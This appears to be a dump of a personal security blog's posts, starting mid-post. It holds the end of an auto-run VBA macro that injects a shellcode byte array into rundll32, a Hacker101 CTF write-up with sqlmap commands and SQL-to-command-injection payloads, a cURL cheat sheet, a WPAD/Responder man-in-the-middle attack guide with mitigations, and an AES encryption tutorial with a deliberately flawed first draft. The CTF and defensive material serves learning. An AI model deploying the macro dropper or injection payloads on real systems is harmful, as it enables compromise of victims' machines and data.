As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long\n#End If\n\nSub Auto_Open()\n    Dim myByte As Long, myArray As Variant, offset As Long\n    Dim pInfo As PROCESS_INFORMATION\n    Dim sInfo As STARTUPINFO\n    Dim sNull As String\n    Dim sProc As String\n\n#If VBA7 Then\n    Dim rwxpage As LongPtr, res As LongPtr\n#Else\n    Dim rwxpage As Long, res As Long\n#End If\n    myArray = Array(-35,-63,-65,32,86,66,126,-39,116,36,-12,91,49,-55,-79,98,49,123,24,3,123,24,-125,-61,36,-76,-73,-126,-52,-70,56,123,12,-37,-79,-98,61,-37,-90,-21,109,-21,-83,-66,-127,-128,-32,42,18,-28,44,92,-109,67,11,83,36,-1,111,-14,-90,2,-68,-44,-105,-52,-79,21,-48,49,59,71,-119,62,-18,120,-66,11,51,-14,-116,-102,51,-25,68,-100,18,-74,-33,-57,-76,56,12,124,-3,34,81,-71,-73,-39,-95,53,70,8,-8,-74,-27,117,53,69,-9,-78,-15,-74,-126,-54,2,74,-107,8,121,-112,16,-117,-39,83,-126,119,-40,-80,85,-13,-42,125,17,91,-6,-128,-10,-41,6,8,-7,55,-113,74,-34,-109,-44,9,127,-123,-80,-4,-128,-43,27,-96,36,-99,-79,-75,84,-4,-35,122,85,-1,29,21,-18,-116,47,-70,68,27,3,51,67,-36,100,110,51,114,-101,-111,68,90,95,-59,20,-12,118,102,-1,4,119,-77,80,85,-41,108,17,5,-105,-36,-7,79,24,2,25,112,-13,43,50,-88,-5,83,-61,-46,-115,58,-81,49,21,-46,66,43,-68,66,-77,-59,81,-76,-125,77,-17,-79,116,94,-80,2,72,-22,17,-7,-58,33,-14,113,127,119,127,26,76,37,2,-38,-38,96,-44,-18,-102,-116,-15,-124,-37,110,-109,-112,-117,-26,97,-91,42,76,-20,67,70,-94,-72,-36,-1,91,-31,-105,-98,-92,60,-46,-95,47,-76,34,111,-40,-67,48,-104,-65,61,-55,89,42,61,-93,93,-4,106,91,92,-39,92,-60,-97,12,-33,3,95,-47,-23,120,86,71,85,23,-105,-121,85,-25,-63,-51,85,-113,-75,-75,6,-86,-71,99,59,103,44,-116,109,-37,-25,-28,-109,2,-49,-86,108,97,83,-84,-110,-9,124,21,-6,7,61,-91,-6,109,-67,-11,-110,122,-110,-6,82,-126,57,83,-6,9,-84,17,-101,14,-27,-12,5,14,10,45,-74,117,95,-46,55,-118,-119,-73,56,-118,-75,-55,5,92,-116,-65,72,92,-85,-80,-1,-63,-102,90,-1,86,-36,78)\n    If Len(Environ(\"ProgramW6432\")) \u003e 0 Then\n        sProc = Environ(\"windir\") \u0026 \"\\\\SysWOW64\\\\rundll32.exe\"\n    Else\n        sProc = Environ(\"windir\") \u0026 \"\\\\System32\\\\rundll32.exe\"\n    End If\n\n    res = RunStuff(sNull, sProc, ByVal 0\u0026, ByVal 0\u0026, ByVal 1\u0026, ByVal 4\u0026, ByVal 0\u0026, sNull, sInfo, pInfo)\n\n    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), \u0026H1000, \u0026H40)\n    For offset = LBound(myArray) To UBound(myArray)\n        myByte = myArray(offset)\n        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0\u0026)\n    Next offset\n    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)\nEnd Sub\nSub AutoOpen()\n    Auto_Open\nEnd Sub\nSub Workbook_Open()\n    Auto_Open\nEnd Sub\n```\n\nYou can see the Variable myArray seems suspicous, when running the payload in Excel I get an error for 'myArray'\n\nIm stuck here at the moment... I was told i would not need windows..\n\n@ me on twitter [@0x0000005](https://twitter.com/0x0000005)\n\n\u003e This Post is marked as `WIP` and will be updated continously.\n"},{"path":"blog/hacker101-ctf-photo-gallery","title":"Hacker101 CTF Photo Gallery [moderate] writeup","subtitle":"a write up for this web challenge","published":true,"datePublished":1609676431536,"tags":["ctf","writeup","hackerone","hacker101","security"],"description":"A write up for the Photo Gallery [moderae] challenge","canonicalUrl":"https://dev.lwlx.xyz/blog/hacker101-ctf-photo-gallery","author":"lwlx","authorPhoto":"/profile","authorTwitter":"0x0000005","bannerPhoto":"/hackerone/hackerone","thumbnailPhoto":"/hackerone/hackerone-photogallery-thumb.jpg","content":"\nThis is my Write Up for the \"Photo Gallery\" challenge of HackerOne's CTF.\n\nAs usual we get a link to webpage, it seems to be an image gallery, but one of the images is broken.\nThe missing one is called `Invisible`, so lets look into that.\n\n```\nhttp://34.74.105.127/ad3e8c7df9/\n```\n\n![initial page](/hackerone/photogallery-start.png \"initial page\")\n\n## Information gathering\n\nwith Burp we were able to find that the server returns no content for this image.\nimages are loaded with a `GET` Request to the server like so:\n\n`GET /ad3e8c7df9/fetch?id=1 HTTP/1.1`\n\nthis also aligns with the first tip we are provided:\n\n\u003e Hint 1: _Consider how you might build this system yourself. What would the **query for fetch** look like?_\n\nnaturally we start fuzzing the `id` parameter.\n\n```python\nGET /ad3e8c7df9/fetch?id=4 HTTP/1.1 # 404\nGET /ad3e8c7df9/fetch?id=0 HTTP/1.1 # 404\nGET /ad3e8c7df9/fetch?id=-1 HTTP/1.1 # 500\n```\n\nalright, no quick wins, so let's give it a try with fizzing using sqlmap.\nQuickly we are able to see that the server seems to be vulnerable to some attack.\n\n```python\nsqlmap -u \"http://34.74.105.127/ad3e8c7df9/fetch?id=2\"\n```\n\nThis command runs for quite a while and will try to find vulnerabilities in the fetch endpoint.\nwhen we are done we should know what to do next.\n\n## Gathered Data\n\n### sqlmap identified the following injection point(s) with a total of 311 HTTP(s) requests:\n\n```python\nParameter: id (GET)\nType: boolean-based blind\nTitle: AND boolean-based blind - WHERE or HAVING clause\nPayload: id=2 AND 3567=3567\n\nType: time-based blind\nTitle: MySQL \u003e= 5.0.12 AND time-based blind (query SLEEP)\nPayload: id=2 AND (SELECT 8480 FROM (SELECT(SLEEP(5)))KHRS)\n```\n\n```python\n[21:44:44] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu\nweb application technology: Nginx 1.14.0\nback-end DBMS: MySQL \u003e= 5.0.12 (MariaDB fork)\n```\n\n### Our Target Server:\n\n    | Type      | Service      | Version                  | Vulnerable?    |\n    | --------- | ------------ | ------------------------ | -------------- |\n    | OS        | Linux Ubuntu | ??                       | not focused    |\n    | Webserver | Nginx        | 1.14.0                   | no             |\n    | Database  | MySQL        | \u003e= 5.0.12 (MariaDB fork) | yes (id param) |\n\nGood, we got something, we know the server is vulnerable to multiple vulnerabilities such as a 'boolean base blind'. We also found the Webserver is Nginx v1.14.0, which sadly has no usable vulnerabilities here. But with us now knowing the exact os and DB System used lets run sqlmap again with that info and see what we get.\n\n```python\nsqlmap -u \"http://34.74.105.127/ad3e8c7df9/fetch?id=2\" -f --os=linux --dbms=mysql --level=3 -o\n```\n\nwe dont really get any more useful information from here.\nsoo.. were kinda stuck lets just get another hint then:\n\n\u003e Hint 2: _Take a few minutes to consider the **state of the union**_\n\nThe state uf the union? are they hinting on using UNION statements in the query?\n_The UNION operator is used to combine the result-set of two or more SELECT statements._\nThat seems like somethng we can make use of, so lets try and combine our query statements f.e. like this:\n\n`http://34.74.105.127/ad3e8c7df9/fetch?id=2 UNION SELECT 'something'`\n\nbut what do we look for? Lets get another hint.\n\n\u003e Hint 3: _This application runs on the **uwsgi-nginx-flask-docker** image_\n\nuwsgi-nginx? hmm havent heard of that, but sems to be some kind of portable all in one flask. lets look for the docs.\n\nhttps://uwsgi-docs.readthedocs.io/en/latest/Configuration.html#ini-files\n\n\u003e uWSGI can be configured using several different methods.\n\nYAML, JSON, INI are some supported formats -\u003e ini beeing the defualt so lets try getting the 'uwsgi.ini' file?\n\n![union select wiht burp repeater](/hackerone/union-select-ini.png \"union select wiht burp repeater\")\n\nthis returns us some configdata pointing to module main which is the entrypoint.\n\n```python\n[uwsgi]\nmodule = main\ncallable = app\n```\n\nso lets see if we can also fethc the main.py\n\n```python\nhttp://35.190.155.168/c947e97f6e/fetch?id=4%20UNION%20SELECT%20%27main.py%27--\n```\n\nHere we get lots of infos our **first FLAG** and the db connection settings:\n\n### FLAG 0:\n\n```python\n%s\n' % (pid, sanitize(ptitle)) fns.append(pfn) rep += 'Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\\n', 1)[-1] + '' rep += '\n\\n' return home.replace('$ALBUMS$', rep) @app.route('/fetch') def fetch(): cur = getDb().cursor() if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0: abort(404)\n# It's dangerous to go alone, take this: # ^FLAG^9e6d57c394c129??????????????????????????????f74dbf2faa0abd571b32c7$FLAG$ return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read() if __name__ == \"__main__\": app.run(host='0.0.0.0', port=80)\n```\n\n`return MySQLdb.connect(host=\"localhost\", user=\"root\", password=\"\", db=\"level5\")`\n\nwe also see that they are using the photos table\n\n`cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, ))`\n\nlets try to fuzz that with sqlmap, since we now know the DB and tables info we can launch a targeted attack.\n\n```python\nsqlmap -u \"http://34.74.105.127/ad3e8c7df9/fetch?id=1\" --method=GET --dump -D level5 -T photos -p id, --code=200 --ignore-code=500 --skip-waf -o --threads 2\n```\n\nThis can take quite a while.. for me it crashed after 40 minutes, so i gave it another go with just focusing on the column `filename` since, here is the value we need.we do this by adding the -C parameter, i also increased the thradcount to 4 to try and get faster results. I also changed the url to contain id=3 since this is the id we want to get the info from.\n\n```python\nsqlmap -u \"http://35.190.155.168/c947e97f6e/fetch?id=3\" --method=GET --dump -D level5 -T photos -p id, --code=200 --ignore-code=500 --skip-waf -o --threads 4 -C filename\n```\n\nThis means that sqlmap will start with the filename of id=3 which is exactly what we want right now.\n\n![starts to query filename of id 3](/hackerone/photo-gallery-hash.png \"query on the filename of id 3\")\nSo lets have a look at our results:\n\n```python\nDatabase: level5\nTable: photos\n[3 entries]\n+------------------------------------------------------------------+\n| filename |\n+------------------------------------------------------------------+\n| 9ef8fc5da15625db993f1c8e120beafc6873d801a804670b9497ecc782ca11fa |\n| files/adorable.jpg |\n| files/purrfect.jpg |\n+------------------------------------------------------------------+\n```\n\n\u003e you might be getting partial values like so:\n\u003e `9ef8fc5di15625db993f1c8e120beafc6873d801a804670?????????????????`\n\u003e you should be able to re-run sqlmap to find the missing characters\n\u003e `9ef8fc5da15625db993f1c8e120beafc6873d801a804670b9497ecc782ca11fa`\n\ndecrypted: `\\*||+ls+-a+tmp.txt`\nanother file! nice lets try and get that with a UNION STATEMENT request like so:\n\n`GET /ad3e8c7df9/fetch?id=4 UNION SELECT 'tmp.txt'-- HTTP/1.1`\nhmm no luck it seems... let's do it another way.\n\nFrom our previous findings we know that files are in the 'files' directory and that we can run sql statements on the id param. So we want to try to move the file or its contents so we can access it. We also got a new hint of using ls output to find temp file.\n\nWe want to run following statements via the vulnerable param:\n\n#### ls in the /files directory and store data in bigWin.txt\n\n`update photos set filename='* || ls ./files \u003ebigWin.txt ' where id=3; commit;`\n\n`GET /ad3e8c7df9/fetch?id=1;%20update%20photos%20set%20filename=%27\\*%20||%20ls%20./files%20%3EbigWin.txt%20%27%20where%20id=3;%20commit;%20-- HTTP/1.1`\n\n#### store all env data in bigWin.txt (because so often flags are here)\n\n`update photos set filename='* || env \u003ebigWin.txt' where id=3; commit;`\n\n`GET /ad3e8c7df9/fetch?id=1;%20update%20photos%20set%20filename%3D%27*%20%7C%7C%20env%20%3Etmp.txt%27%20where%20id%3D3%3B%20commit%3B%20-- HTTP/1.1`\n\nafter you succsessfully ran those you should be able to run the union select again to get ahold of bigWin.txt!\n\n`GET /ad3e8c7df9/fetch?id=4 UNION SELECT 'bigWin.txt'-- HTTP/1.1`\n\nTadaa!! we got it all.\n\n```bash\n\"^FLAG^9ef8fc5da15????????????????????????????????????????????782ca11fa$FLAG$\"\n\"^FLAG^63a407d0083????????????????????????????????????????????4564ee9f2$FLAG$\"\nHOSTNAME=ad3e8c7df92d\nSHLVL=0\n```\n"},{"path":"blog/basic-cURL-cheatsheet-lwlx","title":"the cURL cheat sheet","subtitle":null,"published":true,"datePublished":1609416432536,"tags":["cheatsheet","commandline","curl","security"],"description":"you need.","canonicalUrl":"https://dev.lwlx.xyz/blog/basic-cURL-cheatsheet-lwlx","author":"lwlx","authorPhoto":"/profile","authorTwitter":"0x0000005","bannerPhoto":"/default","thumbnailPhoto":"/default-thumb.jpg","content":"\n## cURL What is it?\n\ncURL describes itself as:\n\n\u003e command line tool and library for transferring data with URLs\n\ncURL is a multipurpose networking tool which has lots of useful usecases.\n\n## cheat sheet\n\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e\u003cstrong\u003eCommand\u003c/strong\u003e\u003c/th\u003e\n\u003cth\u003e\u003cstrong\u003eDescription\u003c/strong\u003e\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ecurl http://lwlx.xyz\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eGET request with \u003ccode\u003ecURL\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ecurl http://lwlx.xyz -v\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eVerbose GET request with \u003ccode\u003ecURL\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ecurl http://admin:password@lwlx.xyz/ -vvv\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003ecURL\u003c/code\u003e Basic Auth login\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ecurl -u admin:password http://lwlx.xyz/ -vvv\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eAlternate \u003ccode\u003ecURL\u003c/code\u003e Basic Auth login\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ecurl -u admin:password -L http://lwlx.xyz/\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003ecURL\u003c/code\u003e Basic Auth login, follow redirection\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ecurl -u admin:password 'http://lwlx.xyz/search.php?port_code=us'\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003ecURL\u003c/code\u003e GET request with parameter\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ecurl -d 'username=user\u0026amp;password=pass' -L http://lwlx.xyz/login.php\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003ePOST request with \u003ccode\u003ecURL\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ecurl -d 'username=user\u0026amp;password=pass' -L http://lwlx.xyz/login.php -v\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eDebugging with \u003ccode\u003ecURL\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ecurl -d 'username=user\u0026amp;password=pass' -L --cookie-jar /dev/null http://lwlx.xyz/login.php -v\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eCookie usage with \u003ccode\u003ecURL\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ecurl -d 'username=user\u0026amp;password=pass' -L --cookie-jar cookies.txt http://lwlx.xyz/login.php\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003ecURL\u003c/code\u003e with cookie file\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ecurl -H 'Content-Type: application/json' -d '{ \"username\" : \"user\", \"password\" : \"pass\" }'\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003ecURL\u003c/code\u003e specify content type\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ecurl -X OPTIONS http://lwlx.xyz/ -vv\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003ecURL\u003c/code\u003e OPTIONS request\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ecurl -X PUT -d @test.txt http://lwlx.xyz/test.txt -vv\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eFile upload with \u003ccode\u003ecURL\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ecurl -X DELETE http://lwlx.xyz/test.txt -vv\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eDELETE method with \u003ccode\u003ecURL\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n"},{"path":"blog/abuse-WPAD-protocol-to-MitM-any-network","title":"MitM using WPAD Proxy Protocol:","subtitle":"Getting a reverse shell on windows client","published":true,"datePublished":1605802028864,"tags":["MitM","WPAD","aPAColypse","PAC","exploit","security"],"description":"When a decision made 25+ years ago makes your computer vulnerable to the stupidest attack you've heard of.","canonicalUrl":"https://dev.lwlx.xyz/blog/abuse-WPAD-protocol-to-MitM-any-network","author":"lwlx","authorPhoto":"/profile","authorTwitter":"0x0000005","bannerPhoto":"/wpad-responder-exploit/wpad_post_img","thumbnailPhoto":"/wpad-responder-exploit/wpad_thumb.jpg","content":"\n## What is WPAD? `[WIP]`\n\nSometime in the early days of the Internet - the web 1.0 era - a couple of devs at Netscape decided that JavaScript was an acceptable language to write configuration files in. The result was Proxy Auto-Config (PAC) - a configuration file format that works as follows: The browser connects to a pre-configured server, downloads the PAC file, and executes a particular Javascript function to determine proper proxy configuration. Why not? It is more expressive and less tedious than XML and seems reasonable to provide configurations to many clients.\n\nPAC itself works with a protocol called Web Proxy Auto-Discovery (WPAD) WPAD removes the need for the browser or the user to have a pre-configured server to connect to. Instead, WPAD allows the computer to query the local network to discover the server to load the PAC file from.\n\n## WPAD always follows this schema:\n\n1. Determine if the system should use WPAD, either by looking at browser settings or asking the host OS if the browser is set to match the OS setting.\n2. Ensure a network connection is available.\n3. If WPAD is to be used, issue a DHCPINFORM query to ask for the URL of the PAC script.\n4. If the DHCPINFORM query fails and does not return a URL, perform a DNS lookup for the hostname `wpad`.\n5. If the DNS lookup succeeds, then the PAC URL is `http://wpad/wpad.dat`.\n6. Establish an HTTP(S) connection to the discovered URL's server, thus downloading the PAC script.\n7. If the PAC script has downloaded successfully, parse it, and optionally compile it.\n8. For each network request, call the `FindProxyForURL()` function in the PAC script and use the proxy settings returned from this function.\n\n\u003e WPAD is practically asking the network \"Hey there! would you like to send me a **payload** i can **execute**?\"\n\nYou can clearly see how a bad actor can abuse this.\n\nWindows is certainly not the only piece of software that implements WPAD. Other operating systems (OS X, Linux) and applications do as well. For example, Google Chrome also has a WPAD implementation, but in Chrome's case, the JavaScript code from the PAC is evaluated inside of a sandbox. Other operating systems that support WPAD don't enable it by default anymore. That is why Windows is currently the most attractive target for this sort of attack.\n\n## Exploit basis\n\nWhen a device has these protocols enabled, if the local network DNS cannot resolve the name, the machine will ask the whole network to get a host. So, any host of the network, who knows its IP, can reply. Even if a host replies with incorrect information, it will still be regarded as a legitimate response.\n\n# Exploitable scenario\n\n1. victim and host are in the same network\n2. The victim opens the browser, which is configured with the option `automatically detect settings` in `Local Area Network (LAN) Settings`.\n3. The name resolution, which is performed with the steps we mentioned earlier, will be questioned on the victim's computer first.\n4. In step 3, because the DNS Server does not have a corresponding record, the system's name is sent as LLMNR or NetBIOS-NS query.\n5. The attacker listens to network traffic, catches name resolution query. It tells to the victim that he has the wpad.dat the victim is look for.\n\nAccording to the flow above, if an attacker wants to make sure that the attack will be successful, he must perform the following attacks:\n\n- DHCP poisoning attack\n- DNS poisoning attack\n- WPAD poisoning attack\n\n\u003c!--\n# proof of concept\n\n## install Responder\n\n## configure config\n--\u003e\n\n## start analyzing first\n\nusing the `-A` option enables analyze only mode\n**macOS:**\n\n```shell\n./Responder.py -i \u003cyour ip address\u003e -A\n```\n\n**Linux:**\n\n```shell\n./Responder.py -I \u003cyour net interface\u003e -A\n```\n\n## create payload adn custom FindProxyForURL()\n\n## run the attack:\n\n- `-w`: starts WPAD service\n- `-f`: fingerprints victims\n- `-v`: verbose output\n- `-F`: force auth to WPAD service\n\n```shell\n ./Responder.py -i 192.168.1.215 -w -f -v -F\n```\n\nforce basic auth to try and gain user \u0026 pass\n\n- `-b`: force Basic HTTP authentication\n\n```shell\n ./Responder.py -i 192.168.1.215 -w -f -v -b -F\n```\n\n![Succsessfull WPAD attack](/wpad-responder-exploit/responder-intercepted.png \"Succsessfull WPAD attack, planting a reverse shell on the victim.\")\n\n# Mitigation\n\n- Create a DNS entry called \"WPAD\" that points to the real proxy server.\n- Disabling automatic proxy discovery in browsers and operating systems.\n- Configure firewalls and proxies to block and log outbound requests for wpad.dat files.\n\n\u003e ## `[WIP]` This article is a work in progress and will be updated with a proof of concept soon.\n\n\u003c!--\n## Read more about this topic:\n\n[https://googleprojectzero.blogspot.com/2017/12/apacolypse-now-exploiting-windows-10-in_18.html](https://googleprojectzero.blogspot.com/2017/12/apacolypse-now-exploiting-windows-10-in_18.html)\n--\u003e\n"},{"path":"blog/consistent-x-device-encryption-in-javascript","title":"Getting consistent Encryption in Node / PHP / Browser and openSSL","subtitle":null,"published":true,"datePublished":1603967203286,"tags":["encryption","decryption","openssl","nodejs","php"],"description":"Cryptography is hard, and because it's already hard enough, here is a nice guide on the AES Cipher in different environments.","canonicalUrl":"https://dev.lwlx.xyz/blog/consistent-x-device-encryption-in-javascript","author":"lwlx","authorPhoto":"/profile","authorTwitter":"0x0000005","bannerPhoto":"/crypto","thumbnailPhoto":"/crypto_thumb.jpg","content":"\nI recently was tasked to find a solution for encrypting data in different places and to being able to decrypt them all in a browser during runtime.\n\nSurprisingly, it was much more challenging than expected since there was so little documentation around this online. What was available were a few code-only examples, so I was forced to do R \u0026 D and try all implementations and compare the in- \u0026 outputs.\n\nGiven the lack of a decent out-of-the-box solution, I worry that many developers are settling for easy to use, insecure solutions that limit your project’s security and flexibility. Security should be easy to use and accessible.\n\n\u003e Clone the repo here to get started with this setup: \u003ca href=\"https://gist.github.com/Lawlez/88e04e3541cc0608c953a118b86bfc1a\"\u003ehttps://gist.github.com/Lawlez/88e04e3541cc0608c953a118b86bfc1a\u003c/a\u003e\n\nOkay, so lets assume we use following input data to test each implementation:\n\n- **`key`** = '5035ae3567f2e69320b083d59a7364cf8d4b14e77d7b798051241ce546b327d9' ` //must be 256 bits`\n- **`iv`** = '1d6ef201e0e7a9019ddf8414034325e2' ` //must be 128 bits`\n- **`inputData`** = `{\"TestData\":\"w17h Spé^cIäl chàær§¢tèrs\", \"OK\":\"://seems/fine?x=lol\"}`\n\nLet's quickly run through and test each implementation:\n\n## Using Node JS Crypto module\n\nNode Provides a nice `crypto` implementation. It's documentation is rather sparse, but this is what most resources suggest by using:\n\n- `crypto.randomBytes()`\n- `crypto.createCipheriv()`\n- `crypto.createDecipheriv()`\n\n```javascript\nconst crypto = require('crypto')\n\n/**********************************************************************\n*\n*        DECRYPTION MODULE FOR USE INSIDE NODE.JS                     *\n*\n***********************************************************************/\n\nconst encryption = (data = 'TestString {} Héllöüä') =\u003e {\n\n   const secretPhrase = crypto.randomBytes(16).toString('hex')\n   const salt = crypto.randomBytes(128 / 8).toString('hex')\n   //here we generate the key and give it back as a string, we use 100k iterations\n   //as suggested in best practices\n   //We can use the key multiple times to encrypt multiple things(-30GB), we just cant use\n   //the same initialization vector twice\n   //the key for aes-256 needs to be 256 bits which equals 32 bytes or 32 characters\n   const configKey = crypto.pbkdf2Sync(secretPhrase, salt, 100000, 32, 'sha256').toString('hex').substr(0, 32)\n   //create unique IV for each encryption, the key can be reused. IV needs to always be 16 bytes\n   const IV = crypto.randomBytes(16)\n\n   //create ciphers for each encryption using the shared key and the unuique IV\n   const projectConfigCipher = crypto.createCipheriv('aes-256-cbc', configKey, IV.toString('hex').substr(0,16)\n\n   //encripting the storage location using the prepared cipher\n   const encrypted = Buffer.concat([configStorageCipher.update(\n       'STORAGE', 'utf8'\n   ), configStorageCipher.final()]).toString('hex')\n\n   return encrypted\n\n}\n```\n\n\u003e this is **NOT** the final implementation; check below to see it.\n\n### Testing the implementation\n\nWe notice that we need to trim the key to 32bytes and the IV to 16 bytes. This is likely because of the conversion from hex to string after the creation of the key.\n\n- **`key`** = '5035ae3567f2e69320b083d59a7364cf' ` //is now 32 bytes string`\n- **`iv`** = '1d6ef201e0e7a901' ` //is now 16 bytes string`\n\nThis will probably lead to an issue later on since other implementations actually want the longer strings. Maybe we can find a workaround by base64 encoding instead of stringifying the key and iv.\n\na quick test reveals, yes, we actually can:\n\n```\nconst IV = crypto.randomBytes(16)\n\nconsole.log(IV)\n// \u003cBuffer c1 1e 98 84 54 eb 85 f6 b3 d0 51 87 d2 62 80 a7\u003e\n\nconsole.log(IV.toString('base64'))\n// wR6YhFTrhfaz0FGH0mKApw==\n\nconsole.log(Buffer.from(IV.toString('base64'), 'base64'))\n//\u003cBuffer c1 1e 98 84 54 eb 85 f6 b3 d0 51 87 d2 62 80 a7\u003e\n```\n\nnow we could also just create a buffer again from the string to make it 16/32 bytes (ready for usage):\n\n```\nBuffer.from('5035ae3567f2e69320b083d59a7364cf8d4b14e77d7b798051241ce546b327d9', 'hex')\n//\u003cBuffer 50 35 ae 35 67 f2 e6 93 20 b0 83 d5 9a 73 64 cf 8d 4b 14 e7 7d 7b 79 80 51 24 1c e5 46 b3 27 d9\u003e\n\nBuffer.from('1d6ef201e0e7a9019ddf8414034325e2','hex'))\n//\u003cBuffer 1d 6e f2 01 e0 e7 a9 01 9d df 84 14 03 43 25 e2\u003e\n```\n\nThis seems to be a nice solution when you **receive** the key and iv as an input; if we generate it ourselves, however, it better to just avoid the conversion to string after generation that many people use in examples:\n\n```\n// type Buffer, 16 bytes\nconst IV = crypto.randomBytes(16)\n\n// type Buffer, 32 bytes\nconst configKey = crypto.pbkdf2Sync(secretPhrase, salt, 100000, 32, 'sha256')\n\n```\n\nThis key and IV pair can be consumed directly by our ciphers, but we would need to convert it to a hex string first to save and forward them.\n\n### So what is the output of this function?\n\nThe output we received is of type buffer, but when we convert it to a string using `toString('hex')` we can read the data:\n\n- **`OUTPUT`** = '\u003cBuffer f2 fb 62 b1 7e e9 da 0c 8c bd 56 f2 45 a9 87 60 b4 e2 a6 d0 c5 de f1 50 bc 6d 86 00 f8 5d b4 79\u003e' ` //is 32 bytes`\n- **`OUTPUT_Stringified`** = 'f2fb62b17ee9da0c8cbd56f245a98760b4e2a6d0c5def150bc6d8600f85db479' ` //is now 64 bytes string`\n- **`OUTPUT_Base64`** = '8vtisX7p2gyMvVbyRamHYLTiptDF3vFQvG2GAPhdtHk=' ` //is now 44 bytes string`\n\nso using the codes below, we can switch between these three outputs as we like\n\n```javascript\n//output Buffer\nencrypted = Buffer.concat([encrypted, Cipher.final()]);\n\n//output String\nencrypted = Buffer.concat([encrypted, Cipher.final()]).toString(\"hex\");\n\n//output Base64\nencrypted = Buffer.concat([encrypted, Cipher.final()]).toString(\"base64\");\n\n//revert conversion to base64\nBuffer.from(encrypted.toString(\"base64\"), \"base64\");\n```\n\nFrom what we have learned here, I guess the best option is to use the base64 output method since we can easily convert it to a buffer\n\n## Using browserify-aes's node crypto-like implementation inside the Browser\n\nInside the browser, we cannot use Nodes.js built-in modules. Using `browserify-aes` we can use a node-like crypto implementation, which uses the same syntax as the node implementation. In my use case, I only need to decipher in the browser, this means I don’t have to worry about a truly random key generation or ciphering.\n\n```js\nimport crypto from \"browserify-aes\";\n\n/**********************************************************************\n *\n *        DECRYPTION MODULE FOR USE IN BROWSER DURING RUNTIME          *\n *\n ***********************************************************************/\nconst decrypt = (Base64Hash) =\u003e {\n  //we use the base64 hash generated by openssl cli as an input\n  const Base64Hash =\n    \"Z8QIo6YuR7DZqmHHV4WqqorUnUZ2n88gMFADMCt2FKUn/ZeYUj1DEBNS2NthignUNR0hw+OOFU7qACKPZbxx8k0Pe0McXNDrOnUtl3dIwdg=\";\n  const Key =\n    \"5035ae3567f2e69320b083d59a7364cf8d4b14e77d7b798051241ce546b327d9\";\n  const IV = \"1d6ef201e0e7a9019ddf8414034325e2\";\n  const hexToBin = (hex) =\u003e {\n    //converts hex strings to binary arr\n    for (var bytes = [], c = 0; c \u003c hex.length; c += 2) {\n      bytes.push(parseInt(hex.substr(c, 2), 16));\n    }\n    return bytes;\n  };\n  //ein neuer cipher wird vorbereitet, mittels aes256, unserem 256 bit KEY und dem config IV\n  const decipher = crypto.createDecipheriv(\n    \"aes256\",\n    hexToBin(Key),\n    hexToBin(IV)\n  );\n\n  //der hash wird nun decrypted mittels dem zuvor erstellten cipher\n  const decrypted = Buffer.concat([\n    decipher.update(Buffer.from(Base64Hash, \"base64\")),\n    decipher.final(),\n  ]).toString(\"utf8\");\n\n  return JSON.parse(decrypted);\n};\n```\n\n- **`OUTPUT`** = {TestData: \"w17h Spé^cIäl chàær§¢tèrs\", OK: \"://seems/fine?x=lol\"} ` //yes, thats our original input! :D`\n\n## ENCRYPTION \u0026 DECRYPTION MODULE FOR PHP7+ USING 